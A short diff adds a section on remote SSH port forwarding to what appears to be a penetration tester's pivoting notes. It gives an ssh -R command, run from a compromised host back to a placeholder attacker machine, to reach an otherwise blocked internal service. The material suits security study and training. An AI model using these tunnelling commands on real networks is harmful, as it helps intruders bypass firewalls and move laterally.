@@ -35,4 +35,15 @@ proxychains4 -f proxychains4.conf smbclient ...
 ```
 The trick is to use whatever tool you are calling with the same parameters you would otherwise with regards to IPs and ports, and just let proxychains handle the proxying.
 
+## Remote Port Forwarding
 
+(pre-req): This requires that we've setup an SSH server on our kali machine with:
+```
+sudo systemctl start ssh
+```
+
+If the firewall setup doesn't allow us to SSH from `${OWNED_IP}`, which we have compromised, it can make sense to remote port forward back to our `${ATTACKER_IP}` with (run from `${OWNED_IP0}`):
+```
+ssh -N -R 127.0.0.1:${OWNED_PORT0}:${EXTERNAL_IP}:${EXTERNAL_PORT} ${ATTACKER_USER}@${ATTACKER_IP}
+```
+Now, we can interact with `${EXTERNAL_IP}:${EXTERNAL_PORT}` via `127.0.0.1:${OWNED_PORT0}`.
